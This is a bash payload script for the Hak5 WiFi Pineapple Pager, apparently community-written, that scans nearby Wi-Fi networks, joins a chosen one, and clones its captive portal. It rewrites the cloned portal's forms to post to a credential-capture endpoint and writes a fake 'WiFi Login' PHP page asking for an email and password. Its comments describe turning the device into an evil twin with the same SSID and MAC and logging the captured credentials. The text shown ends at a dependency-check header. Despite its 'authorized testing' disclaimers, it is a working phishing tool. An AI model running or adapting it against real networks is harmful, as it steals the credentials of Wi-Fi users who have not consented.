#!/bin/bash
# Title: Clone Captive Portal
# Description: Scan for SSIDs, connect to selected network, detect and clone captive portal
# Purpose: Automate captive portal reconnaissance and cloning for authorized security assessments
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: interception

# IMPORTANT! As of Pager Firmware 1.0.4 the opkg source list is broken with a missing repository.
# To fix, comment out or remove the offending line (Hak5) in /etc/opkg/distfeeds.conf before installing packages.

# =============================================================================
# EDUCATIONAL USE
# =============================================================================
# This payload is intended for educational and authorized security testing purposes only.
# It demonstrates how captive portals work and how they can be cloned for security research.
# Always obtain proper authorization before using this tool on any network.

# =============================================================================
# RED TEAM USE
# =============================================================================
# For authorized red team engagements, this payload provides end-to-end automation:
#   1. Scan for nearby WiFi networks with captive portals
#   2. Connect to target network and detect portal presence
#   3. Clone portal HTML/CSS/JS to /www/goodportal/{ssid}_{timestamp}/
#   4. Auto-modify forms to capture credentials via /captiveportal/ endpoint
#   5. Configure Open AP as evil twin (same SSID, optional MAC clone)
#   6. Optionally add SSID to pool for future use
#
# Cloned portals are compatible with:
#   - goodportal_configure payload (recommended)
#   - EvilPortals collection format (github.com/kleo/evilportals)
#
# Credentials captured by goodportal are saved to:
#   /root/loot/goodportal/credentials_YYYY-MM-DD_HH-MM-SS.log

# =============================================================================
# DESIGN PRINCIPLES
# =============================================================================
#   - Save and restore interface state on exit (cleanup trap)
#   - Save and restore Open AP config if modified
#   - User confirmation before destructive actions
#   - Auto-install missing dependencies with user consent
#   - Compatible with goodportal and evilportals ecosystems
#   - Fallback methods (wget -> curl) for portal cloning
#   - Handle both open and WPA-protected networks

# =============================================================================
# WORKFLOW
# =============================================================================
#   Phase 1: Scan for SSIDs using wlan1 (up to 20 networks, sorted by signal)
#   Phase 2: User selects target network from numbered list
#   Phase 3: Connect to network (open or WPA with password prompt)
#   Phase 4: Detect captive portal via standard detection URLs
#   Phase 5: Clone portal recursively (HTML, CSS, JS, images)
#   Phase 6: Create credential capture handler (PHP wrapper)
#   Phase 7: Configure evil twin (Open AP SSID/MAC, SSID Pool)

# =============================================================================
# DEPENDENCIES
# =============================================================================
#   - iw (WiFi scanning and interface management)
#   - wpa_supplicant (network connection)
#   - curl (portal detection and fallback cloning)
#   - wget (recursive portal cloning - installed if missing)

# =============================================================================
# CHANGELOG (update in README.md as well!)
# =============================================================================
#   1.0 - Initial release
#       - SSID scanning with signal strength sorting
#       - Open and WPA network connection support
#       - Captive portal detection via multiple endpoints
#       - Recursive portal cloning with wget/curl fallback
#       - Form action modification for credential capture
#       - PHP credential handler with login overlay fallback
#       - Interface state save/restore
#       - Open AP configuration via UCI (persistent)
#       - MAC cloning option for full evil twin
#       - SSID Pool integration
#       - Open AP config backup/restore

# =============================================================================
# TODO
# =============================================================================
#   - Support for 802.1X/Enterprise network authentication
#   - Automatic goodportal_configure integration (start portal after clone)
#   - JavaScript-based portal detection for SPAs
#   - Option to clone multiple pages (follow links)
#   - Certificate cloning for HTTPS portals

# =============================================================================
# CONFIGURATION
# =============================================================================
INTERFACE="wlan1"
LOOT_DIR="/root/loot/captive_portals"
PORTAL_DIR="/www/goodportal"
TEMP_DIR="/tmp/clone_portal"
WPA_CONF="/tmp/clone_portal_wpa.conf"
WPA_CTRL="/tmp/clone_portal_wpa"
TIMEOUT=15
MAX_SSIDS=20

# Original interface state (saved before modification)
ORIGINAL_IFACE_STATE=""
ORIGINAL_IFACE_MODE=""
ORIGINAL_IFACE_UP=""
ORIGINAL_WPA_PID=""

# Captive portal detection URLs (standard endpoints)
DETECTION_URLS=(
    "http://connectivitycheck.gstatic.com/generate_204"
    "http://www.gstatic.com/generate_204"
    "http://clients3.google.com/generate_204"
    "http://captive.apple.com/hotspot-detect.html"
    "http://www.apple.com/library/test/success.html"
    "http://detectportal.firefox.com/success.txt"
    "http://www.msftconnecttest.com/connecttest.txt"
)

# =============================================================================
# SAVE/RESTORE INTERFACE STATE
# =============================================================================
save_interface_state() {
    LOG "Saving original interface state..."
    
    # Check if interface exists
    if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
        LOG yellow "  Interface $INTERFACE not found"
        return 1
    fi
    
    # Save if interface is up or down
    if ip link show "$INTERFACE" | grep -q "state UP"; then
        ORIGINAL_IFACE_UP="up"
    else
        ORIGINAL_IFACE_UP="down"
    fi
    
    # Save interface mode (monitor, managed, etc.)
    ORIGINAL_IFACE_MODE=$(iw dev "$INTERFACE" info 2>/dev/null | grep "type" | awk '{print $2}')
    if [ -z "$ORIGINAL_IFACE_MODE" ]; then
        ORIGINAL_IFACE_MODE="managed"
    fi
    
    # Check if there's an existing wpa_supplicant for this interface
    ORIGINAL_WPA_PID=$(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v "clone_portal" | grep -v grep | awk '{print $1}' | head -1)
    
    # Save connection info if connected
    ORIGINAL_IFACE_STATE=$(wpa_cli -i "$INTERFACE" status 2>/dev/null | grep -E "^(ssid|bssid|wpa_state)=" || echo "")
    
    LOG "  Mode: $ORIGINAL_IFACE_MODE"
    LOG "  State: $ORIGINAL_IFACE_UP"
    if [ -n "$ORIGINAL_WPA_PID" ]; then
        LOG "  Existing wpa_supplicant PID: $ORIGINAL_WPA_PID"
    fi
}

restore_interface_state() {
    LOG "Restoring interface to original state..."
    
    # Kill wpa_supplicant we started
    if [ -f /tmp/clone_portal_wpa.pid ]; then
        kill $(cat /tmp/clone_portal_wpa.pid) 2>/dev/null
        rm -f /tmp/clone_portal_wpa.pid
    fi
    
    # Kill any wpa_supplicant using our config
    for pid in $(ps | grep "wpa_supplicant" | grep "clone_portal" | grep -v grep | awk '{print $1}'); do
        kill -9 "$pid" 2>/dev/null
    done
    
    # Release DHCP lease we obtained
    ip addr flush dev "$INTERFACE" 2>/dev/null
    
    # Restore interface mode
    ip link set "$INTERFACE" down 2>/dev/null
    if [ -n "$ORIGINAL_IFACE_MODE" ]; then
        iw dev "$INTERFACE" set type "$ORIGINAL_IFACE_MODE" 2>/dev/null
        LOG "  Restored mode: $ORIGINAL_IFACE_MODE"
    else
        iw dev "$INTERFACE" set type managed 2>/dev/null
    fi
    
    # Restore interface up/down state
    if [ "$ORIGINAL_IFACE_UP" = "up" ]; then
        ip link set "$INTERFACE" up 2>/dev/null
        LOG "  Interface brought up"
    fi
    
    # If there was an original wpa_supplicant, it should still be running
    # (we only killed our own clone_portal wpa_supplicant)
    if [ -n "$ORIGINAL_WPA_PID" ]; then
        if ps | grep -q "^\s*$ORIGINAL_WPA_PID"; then
            LOG "  Original wpa_supplicant still running"
        else
            LOG yellow "  Original wpa_supplicant was terminated - manual reconnection may be needed"
        fi
    fi
}

# =============================================================================
# OPEN AP CONFIGURATION (UCI-based, persistent)
# =============================================================================
OPEN_AP_IFACE="wlan0open"
ORIGINAL_OPEN_AP_SSID=""
ORIGINAL_OPEN_AP_MAC=""
ORIGINAL_OPEN_AP_DISABLED=""

get_open_ap_config() {
    ORIGINAL_OPEN_AP_SSID=$(uci get wireless.wlan0open.ssid 2>/dev/null)
    ORIGINAL_OPEN_AP_MAC=$(uci get wireless.wlan0open.macaddr 2>/dev/null)
    ORIGINAL_OPEN_AP_DISABLED=$(uci get wireless.wlan0open.disabled 2>/dev/null)
}

backup_open_ap_config() {
    LOG "Backing up Open AP config..."
    get_open_ap_config
    echo "$ORIGINAL_OPEN_AP_SSID" > /tmp/clone_portal_backup_ssid
    echo "$ORIGINAL_OPEN_AP_MAC" > /tmp/clone_portal_backup_mac
    echo "$ORIGINAL_OPEN_AP_DISABLED" > /tmp/clone_portal_backup_disabled
    LOG "  SSID: $ORIGINAL_OPEN_AP_SSID"
    LOG "  MAC:  $ORIGINAL_OPEN_AP_MAC"
}

set_open_ap() {
    local ssid="$1"
    local mac="$2"
    
    LOG "Configuring Open AP..."
    
    # Set SSID
    uci set wireless.wlan0open.ssid="$ssid"
    LOG "  SSID: $ssid"
    
    # Set MAC if provided
    if [ -n "$mac" ]; then
        uci set wireless.wlan0open.macaddr="$mac"
        LOG "  MAC:  $mac"
    fi
    
    # Enable Open AP
    uci set wireless.wlan0open.disabled='0'
    
    # Commit to flash
    uci commit wireless
    
    # Apply changes
    wifi reload
    sleep 2
    
    LOG green "  Open AP configured!"
}

restore_open_ap_config() {
    if [ -f "/tmp/clone_portal_backup_ssid" ]; then
        LOG "Restoring Open AP config..."
        local orig_ssid=$(cat /tmp/clone_portal_backup_ssid)
        local orig_mac=$(cat /tmp/clone_portal_backup_mac 2>/dev/null)
        local orig_disabled=$(cat /tmp/clone_portal_backup_disabled 2>/dev/null)
        
        [ -n "$orig_ssid" ] && uci set wireless.wlan0open.ssid="$orig_ssid"
        [ -n "$orig_mac" ] && uci set wireless.wlan0open.macaddr="$orig_mac"
        [ -n "$orig_disabled" ] && uci set wireless.wlan0open.disabled="$orig_disabled"
        
        uci commit wireless
        wifi reload
        
        rm -f /tmp/clone_portal_backup_*
        LOG green "  Open AP restored: $orig_ssid"
    fi
}

# =============================================================================
# CLEANUP HANDLER
# =============================================================================
cleanup() {
    LOG "Cleaning up..."
    
    # Restore interface to original state
    restore_interface_state
    
    # Clean temp files
    rm -rf "$WPA_CTRL" 2>/dev/null
    rm -f "$WPA_CONF" 2>/dev/null
    rm -rf "$TEMP_DIR/clone" 2>/dev/null
    
    led_off
}
trap cleanup EXIT INT TERM

# =============================================================================
# LED PATTERNS
# =============================================================================
# === LED CONTROL ===
led_pattern() {
    . /lib/hak5/commands.sh
    HAK5_API_POST "system/led" "$1" >/dev/null 2>&1
}

led_off() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":100,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_scanning() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":500,"offms":500,"next":true,"rgb":{"1":[false,false,true],"2":[false,false,true],"3":[false,false,false],"4":[false,false,false]}},{"onms":500,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_found() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[true,false,false],"2":[true,false,false],"3":[true,false,false],"4":[true,false,false]}}]}'
}

led_success() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_connecting() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_cloning() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_fail() {
    LED FAIL
}

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

# Sanitize SSID for use as directory name
sanitize_ssid() {
    local ssid="$1"
    # Replace spaces and special chars with underscores
    echo "$ssid" | tr -cs 'a-zA-Z0-9_-' '_' | sed 's/_*$//' | head -c 50
}

# Get PHY for interface
get_phy() {
    local iface=$1
    iw dev "$iface" info 2>/dev/null | awk '/wiphy/ {print "phy" $2}'
}

# =============================================================================
# PHASE 1: SCAN FOR SSIDS
# =============================================================================
scan_ssids() {
    LOG "=== SCANNING FOR NETWORKS ==="
    led_scanning
    
    mkdir -p "$TEMP_DIR"
    
    # Ensure interface is up and in managed mode
    ip link set "$INTERFACE" down 2>/dev/null
    iw dev "$INTERFACE" set type managed 2>/dev/null
    ip link set "$INTERFACE" up 2>/dev/null
    sleep 2
    
    LOG "Scanning on $INTERFACE..."
    
    # Perform scan
    local scan_output
    scan_output=$(iw dev "$INTERFACE" scan 2>&1)
    
    if [ $? -ne 0 ]; then
        # Interface might be busy, try again
        sleep 3
        scan_output=$(iw dev "$INTERFACE" scan 2>&1)
    fi
    
    # Parse scan results - extract SSID, BSSID, signal, and channel
    echo "$scan_output" | awk '
    BEGIN { bssid=""; ssid=""; signal=""; freq=0; }
    /^BSS / {
        if (bssid != "" && ssid != "" && ssid != "HIDDEN") {
            # Convert freq to channel
            if (freq >= 2412 && freq <= 2484) {
                ch = (freq - 2407) / 5
            } else if (freq >= 5180) {
                ch = (freq - 5000) / 5
            } else {
                ch = 0
            }
            print signal "|" ssid "|" bssid "|" ch
        }
        bssid = $2
        sub(/\(on.*/, "", bssid)
        ssid = ""
        signal = ""
        freq = 0
    }
    /SSID:/ {
        ssid = $0
        sub(/.*SSID: */, "", ssid)
        gsub(/^[ \t]+|[ \t]+$/, "", ssid)
        if (ssid == "") ssid = "HIDDEN"
    }
    /signal:/ {
        signal = $2
        sub(/\..*/, "", signal)
    }
    /freq:/ {
        freq = $2
        sub(/\..*/, "", freq)
    }
    END {
        if (bssid != "" && ssid != "" && ssid != "HIDDEN") {
            if (freq >= 2412 && freq <= 2484) {
                ch = (freq - 2407) / 5
            } else if (freq >= 5180) {
                ch = (freq - 5000) / 5
            } else {
                ch = 0
            }
            print signal "|" ssid "|" bssid "|" ch
        }
    }' | sort -t'|' -k1 -nr | head -n $MAX_SSIDS > "$TEMP_DIR/ssids.txt"
    
    local ssid_count=$(wc -l < "$TEMP_DIR/ssids.txt" 2>/dev/null || echo "0")
    LOG "Found $ssid_count networks"
    
    if [ "$ssid_count" -eq 0 ]; then
        ERROR_DIALOG "No networks found!\n\nMake sure $INTERFACE is available and try again."
        return 1
    fi
    
    return 0
}

# =============================================================================
# PHASE 2: SELECT SSID
# =============================================================================
select_ssid() {
    LOG "=== SELECT TARGET NETWORK ==="
    
    # Build selection menu
    local menu_text="Select target network:\n\n"
    local idx=1
    local ssids=()
    local bssids=()
    local channels=()
    
    while IFS='|' read -r signal ssid bssid channel; do
        ssids+=("$ssid")
        bssids+=("$bssid")
        channels+=("$channel")
        menu_text="${menu_text}${idx}. ${ssid} (${signal}dBm)\n"
        idx=$((idx + 1))
        if [ $idx -gt $MAX_SSIDS ]; then
            break
        fi
    done < "$TEMP_DIR/ssids.txt"
    
    PROMPT "$menu_text"
    
    local selection
    selection=$(NUMBER_PICKER "Select network (1-$((idx-1)))" "1")
    
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
            LOG "User cancelled"
            return 1
            ;;
        $DUCKYSCRIPT_ERROR)
            ERROR_DIALOG "Selection error"
            return 1
            ;;
    esac
    
    # Validate selection
    if [ "$selection" -lt 1 ] || [ "$selection" -gt $((idx-1)) ]; then
        ERROR_DIALOG "Invalid selection: $selection"
        return 1
    fi
    
    # Store selected network info
    TARGET_SSID="${ssids[$((selection-1))]}"
    TARGET_BSSID="${bssids[$((selection-1))]}"
    TARGET_CHANNEL="${channels[$((selection-1))]}"
    
    LOG "Selected: $TARGET_SSID"
    LOG "  BSSID: $TARGET_BSSID"
    LOG "  Channel: $TARGET_CHANNEL"
    
    # Confirm selection
    local resp
    resp=$(CONFIRMATION_DIALOG "Connect to:\n\n$TARGET_SSID\n\nThis will attempt to connect and detect captive portal.")
    
    case $? in
        $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
            LOG "User cancelled"
            return 1
            ;;
    esac
    
    if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        LOG "User declined"
        return 1
    fi
    
    return 0
}

# =============================================================================
# PHASE 3: CONNECT TO NETWORK
# =============================================================================
connect_to_network() {
    LOG "=== CONNECTING TO NETWORK ==="
    led_connecting
    
    # Create wpa_supplicant config for open network
    cat > "$WPA_CONF" << EOF
ctrl_interface=$WPA_CTRL
update_config=1

network={
    ssid="$TARGET_SSID"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
    
    # Kill any existing wpa_supplicant on this interface
    for pid in $(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v grep | awk '{print $1}'); do
        kill -9 "$pid" 2>/dev/null
    done
    rm -rf "$WPA_CTRL" 2>/dev/null
    sleep 1
    
    # Start wpa_supplicant
    LOG "Starting wpa_supplicant..."
    wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
    echo $! > /tmp/clone_portal_wpa.pid
    sleep 3
    
    # Check if connected
    LOG "Waiting for association..."
    local attempts=0
    local max_attempts=15
    local connected=0
    
    while [ $attempts -lt $max_attempts ]; do
        local status=$(wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" status 2>/dev/null | grep "wpa_state=" | cut -d= -f2)
        
        if [ "$status" = "COMPLETED" ]; then
            connected=1
            break
        fi
        
        attempts=$((attempts + 1))
        sleep 1
    done
    
    if [ $connected -eq 0 ]; then
        LOG red "Failed to associate with network"
        
        # Ask if user wants to try with password
        local resp
        resp=$(CONFIRMATION_DIALOG "Connection failed!\n\nNetwork may require password.\nTry with WPA password?")
        
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
                return 1
                ;;
        esac
        
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            local password
            password=$(TEXT_PICKER "Enter WiFi password" "")
            
            case $? in
                $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                    return 1
                    ;;
            esac
            
            if [ -n "$password" ]; then
                # Recreate config with password
                cat > "$WPA_CONF" << EOF
ctrl_interface=$WPA_CTRL
update_config=1

network={
    ssid="$TARGET_SSID"
    psk="$password"
    scan_ssid=1
}
EOF
                # Restart wpa_supplicant
                for pid in $(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v grep | awk '{print $1}'); do
                    kill -9 "$pid" 2>/dev/null
                done
                rm -rf "$WPA_CTRL" 2>/dev/null
                sleep 1
                
                wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
                sleep 3
                
                # Try again
                attempts=0
                while [ $attempts -lt $max_attempts ]; do
                    status=$(wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" status 2>/dev/null | grep "wpa_state=" | cut -d= -f2)
                    
                    if [ "$status" = "COMPLETED" ]; then
                        connected=1
                        break
                    fi
                    
                    attempts=$((attempts + 1))
                    sleep 1
                done
            fi
        fi
        
        if [ $connected -eq 0 ]; then
            ERROR_DIALOG "Could not connect to:\n$TARGET_SSID"
            return 1
        fi
    fi
    
    LOG green "Associated with $TARGET_SSID"
    
    # Get IP via DHCP
    LOG "Requesting IP address..."
    
    # Kill any existing dhcp client
    killall udhcpc 2>/dev/null
    sleep 1
    
    # Request DHCP lease
    udhcpc -i "$INTERFACE" -t 10 -T 3 -n -q 2>/dev/null
    
    # Verify we got an IP
    local ip_addr=$(ip addr show "$INTERFACE" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
    
    if [ -z "$ip_addr" ]; then
        ERROR_DIALOG "Failed to obtain IP address"
        return 1
    fi
    
    LOG green "Got IP: $ip_addr"
    
    # Get gateway
    GATEWAY=$(ip route show dev "$INTERFACE" 2>/dev/null | grep default | awk '{print $3}')
    LOG "Gateway: $GATEWAY"
    
    return 0
}

# =============================================================================
# PHASE 4: DETECT CAPTIVE PORTAL
# =============================================================================
detect_captive_portal() {
    LOG "=== DETECTING CAPTIVE PORTAL ==="
    led_cloning
    
    PORTAL_URL=""
    PORTAL_DETECTED=0
    
    LOG "Testing connectivity..."
    
    for url in "${DETECTION_URLS[@]}"; do
        LOG "  Testing: $url"
        
        # Use curl to check for redirects
        local response
        response=$(curl -s -L -m $TIMEOUT -o /dev/null -w "%{http_code}|%{url_effective}|%{redirect_url}" "$url" 2>/dev/null)
        
        local http_code=$(echo "$response" | cut -d'|' -f1)
        local final_url=$(echo "$response" | cut -d'|' -f2)
        local redirect_url=$(echo "$response" | cut -d'|' -f3)
        
        LOG "    HTTP: $http_code"
        
        # Check for captive portal indicators
        if [ "$http_code" = "302" ] || [ "$http_code" = "301" ] || [ "$http_code" = "307" ]; then
            # Redirect detected - likely captive portal
            if [ -n "$redirect_url" ]; then
                PORTAL_URL="$redirect_url"
            else
                PORTAL_URL="$final_url"
            fi
            PORTAL_DETECTED=1
            LOG green "  Redirect detected: $PORTAL_URL"
            break
        elif [ "$http_code" = "200" ]; then
            # Check if response is expected or intercepted
            local content
            content=$(curl -s -m $TIMEOUT "$url" 2>/dev/null | head -c 500)
            
            # Check for captive portal signs in response
            if echo "$content" | grep -qiE "(login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi)"; then
                PORTAL_URL="$url"
                PORTAL_DETECTED=1
                LOG green "  Portal content detected"
                break
            fi
        fi
    done
    
    # Also try accessing the gateway directly
    if [ $PORTAL_DETECTED -eq 0 ] && [ -n "$GATEWAY" ]; then
        LOG "  Testing gateway: http://$GATEWAY/"
        
        local gw_response
        gw_response=$(curl -s -m $TIMEOUT "http://$GATEWAY/" 2>/dev/null | head -c 1000)
        
        if [ -n "$gw_response" ]; then
            if echo "$gw_response" | grep -qiE "(login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi|<form)"; then
                PORTAL_URL="http://$GATEWAY/"
                PORTAL_DETECTED=1
                LOG green "  Portal found at gateway"
            fi
        fi
    fi
    
    if [ $PORTAL_DETECTED -eq 0 ]; then
        LOG yellow "No captive portal detected"
        
        local resp
        resp=$(CONFIRMATION_DIALOG "No captive portal detected.\n\nNetwork may have:\n- Direct internet access\n- Portal on HTTPS\n- Delayed portal\n\nTry manual URL?")
        
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_CANCELLED)
                return 1
                ;;
        esac
        
        if [ "$resp" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
            PORTAL_URL=$(TEXT_PICKER "Enter portal URL" "http://")
            
            case $? in
                $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                    return 1
                    ;;
            esac
            
            if [ -n "$PORTAL_URL" ]; then
                PORTAL_DETECTED=1
            fi
        else
            return 1
        fi
    fi
    
    LOG "Portal URL: $PORTAL_URL"
    return 0
}

# =============================================================================
# PHASE 5: CLONE CAPTIVE PORTAL
# =============================================================================
clone_portal() {
    LOG "=== CLONING CAPTIVE PORTAL ==="
    led_cloning
    
    # Create directory name from SSID
    local safe_ssid=$(sanitize_ssid "$TARGET_SSID")
    local timestamp=$(date +%Y%m%d_%H%M%S)
    local portal_name="${safe_ssid}_${timestamp}"
    local clone_dir="$PORTAL_DIR/$portal_name"
    local loot_clone_dir="$LOOT_DIR/$portal_name"
    
    mkdir -p "$clone_dir"
    mkdir -p "$loot_clone_dir"
    mkdir -p "$TEMP_DIR/clone"
    
    LOG "Cloning to: $clone_dir"
    
    # Extract base URL for wget
    local base_url=$(echo "$PORTAL_URL" | sed -E 's|(https?://[^/]+).*|\1|')
    LOG "Base URL: $base_url"
    
    # Clone using wget with recursive depth
    LOG "Downloading portal pages..."
    
    local spinner_id
    spinner_id=$(START_SPINNER "Cloning portal...")
    
    # Download main page and linked resources
    cd "$TEMP_DIR/clone"
    
    wget --quiet \
         --recursive \
         --level=2 \
         --page-requisites \
         --convert-links \
         --adjust-extension \
         --no-parent \
         --no-host-directories \
         --directory-prefix="$TEMP_DIR/clone" \
         --timeout=$TIMEOUT \
         --tries=2 \
         --reject "*.exe,*.zip,*.tar,*.gz,*.pdf,*.doc*,*.xls*" \
         --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" \
         "$PORTAL_URL" 2>/dev/null || true
    
    # Also try to get the root page if we got a deeper URL
    if [ "$PORTAL_URL" != "$base_url/" ]; then
        wget --quiet \
             --page-requisites \
             --convert-links \
             --no-host-directories \
             --directory-prefix="$TEMP_DIR/clone" \
             --timeout=$TIMEOUT \
             --tries=2 \
             --user-agent="Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" \
             "$base_url/" 2>/dev/null || true
    fi
    
    STOP_SPINNER $spinner_id
    
    # Check what we got
    local file_count=$(find "$TEMP_DIR/clone" -type f 2>/dev/null | wc -l)
    LOG "Downloaded $file_count files"
    
    if [ "$file_count" -eq 0 ]; then
        # Try alternative method with curl
        LOG "Trying curl method..."
        
        curl -s -L -m $TIMEOUT \
             -A "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)" \
             -o "$TEMP_DIR/clone/index.html" \
             "$PORTAL_URL" 2>/dev/null
        
        file_count=$(find "$TEMP_DIR/clone" -type f 2>/dev/null | wc -l)
    fi
    
    if [ "$file_count" -eq 0 ]; then
        ERROR_DIALOG "Failed to download portal.\n\nThe portal may require authentication or use HTTPS."
        return 1
    fi
    
    # Move files to portal directory
    cp -r "$TEMP_DIR/clone/"* "$clone_dir/" 2>/dev/null
    
    # Also save to loot
    cp -r "$TEMP_DIR/clone/"* "$loot_clone_dir/" 2>/dev/null
    
    # Find and rename main HTML file to index.html if needed
    if [ ! -f "$clone_dir/index.html" ] && [ ! -f "$clone_dir/index.php" ]; then
        local main_html=$(find "$clone_dir" -name "*.html" -o -name "*.htm" | head -1)
        if [ -n "$main_html" ]; then
            cp "$main_html" "$clone_dir/index.html"
        fi
    fi
    
    # Modify form actions to point to captiveportal handler
    LOG "Modifying form actions..."
    
    find "$clone_dir" -name "*.html" -o -name "*.htm" -o -name "*.php" 2>/dev/null | while read -r file; do
        # Replace form action to point to goodportal captiveportal handler
        sed -i 's|action="[^"]*"|action="/captiveportal/"|g' "$file" 2>/dev/null
        sed -i "s|action='[^']*'|action='/captiveportal/'|g" "$file" 2>/dev/null
        
        # Ensure form method is POST
        sed -i 's|method="[Gg][Ee][Tt]"|method="POST"|g' "$file" 2>/dev/null
    done
    
    # Create portal info file
    cat > "$clone_dir/portal_info.txt" << EOF
Portal Clone Information
========================
Source SSID: $TARGET_SSID
Source BSSID: $TARGET_BSSID
Portal URL: $PORTAL_URL
Clone Date: $(date)
Files: $file_count
EOF
    
    # Set permissions
    chmod -R 755 "$clone_dir"
    find "$clone_dir" -type f -exec chmod 644 {} \;
    
    LOG green "Portal cloned successfully!"
    LOG "  Location: $clone_dir"
    LOG "  Backup: $loot_clone_dir"
    
    # Store for later use
    CLONED_PORTAL_DIR="$clone_dir"
    CLONED_PORTAL_NAME="$portal_name"
    
    return 0
}

# =============================================================================
# PHASE 6: GENERATE INDEX.PHP FOR CREDENTIAL CAPTURE
# =============================================================================
create_credential_handler() {
    LOG "Creating credential capture handler..."
    
    # Check if cloned portal has a form
    local has_form=$(grep -riE "<form" "$CLONED_PORTAL_DIR" 2>/dev/null | wc -l)
    
    if [ "$has_form" -gt 0 ]; then
        LOG "Forms detected in portal - forms will submit to /captiveportal/"
    else
        LOG "No forms detected - creating basic login overlay..."
        
        # Create a simple index.php that wraps the cloned content with a login form
        cat > "$CLONED_PORTAL_DIR/index.php" << 'PHPEOF'
<?php
// Credential capture wrapper for cloned portal
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Redirect to captiveportal handler
    $data = http_build_query($_POST);
    header("Location: /captiveportal/?$data");
    exit;
}

// Check if original index.html exists
$original = __DIR__ . '/original_index.html';
if (!file_exists($original) && file_exists(__DIR__ . '/index.html')) {
    rename(__DIR__ . '/index.html', $original);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .login-container { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 90%; }
        h1 { text-align: center; margin-bottom: 30px; color: #333; font-size: 24px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #555; font-weight: 500; }
        input[type="email"], input[type="text"], input[type="password"] { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
        input:focus { outline: none; border-color: #4a90d9; }
        button { width: 100%; padding: 14px; background: #4a90d9; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: 600; }
        button:hover { background: #357abd; }
        .terms { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>WiFi Login</h1>
        <form method="POST" action="/captiveportal/">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="Enter password">
            </div>
            <input type="hidden" name="hostname" value="<?php echo gethostname(); ?>">
            <input type="hidden" name="ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>">
            <button type="submit">Connect to WiFi</button>
            <p class="terms">By connecting, you agree to the Terms of Service</p>
        </form>
    </div>
</body>
</html>
PHPEOF
        
        # Rename original index.html
        if [ -f "$CLONED_PORTAL_DIR/index.html" ]; then
            mv "$CLONED_PORTAL_DIR/index.html" "$CLONED_PORTAL_DIR/original_index.html"
        fi
    fi
    
    LOG green "Credential handler created"
}

# =============================================================================
# MAIN EXECUTION
# =============================================================================

LOG cyan "=========================================="
LOG cyan "  CLONE CAPTIVE PORTAL"
LOG cyan "=========================================="
LOG ""

LED SETUP

# Initialize directories
mkdir -p "$LOOT_DIR"
mkdir -p "$PORTAL_DIR"
mkdir -p "$TEMP_DIR"

# =============================================================================
# DEPENDENCY CHECK
# =============================================================================
# Map commands to their package names (command:package)
